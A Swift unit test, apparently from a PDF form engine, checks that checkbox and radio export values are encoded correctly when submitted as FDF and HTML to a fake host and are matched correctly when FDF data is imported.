    @Test func optExportValuesAreSubmittedAndImported() throws {
        let host = FakeHost()
        _ = try Self.run(Self.optForm("this.submitForm\\('https://x.test/s'\\); this.submitForm\\({cURL: 'https://x.test/h', cSubmitAs: 'HTML'}\\);"), "go", host)
        try #require(host.submits.count == 2)
        let fdf = try #require(FormData.parse(host.submits[0].body))
        #expect(fdf["r"] == ["Été"])
        #expect(fdf["cb"] == ["Oui"])
        let html = String(decoding: host.submits[1].body, as: UTF8.self)
        #expect(html.contains("cb=Oui"))
        #expect(html.contains("r=%C3%89t%C3%A9"))

        // Imported FDF data with export values selects the matching states.
        let importer = FakeHost()
        importer.importBytes = FormData.fdf([FormData.Entry(name: "cb", values: ["Oui"], isName: true), FormData.Entry(name: "r", values: ["Été"], isName: true)], nil)
        let r = try Self.run(Self.optForm("this.importAnFDF\\(\\);", radioValue: "/Off", checkValue: "/Off"), "go", importer)
        #expect(try Self.valueOf(r.data, "cb") == "0")

        // setValues takes export values as well as state names.
        let data = try filled(Self.optForm("1;", checkValue: "/Off"), ["cb": "Oui"])
        #expect(try Self.valueOf(data, "cb") == "0")
    }
}
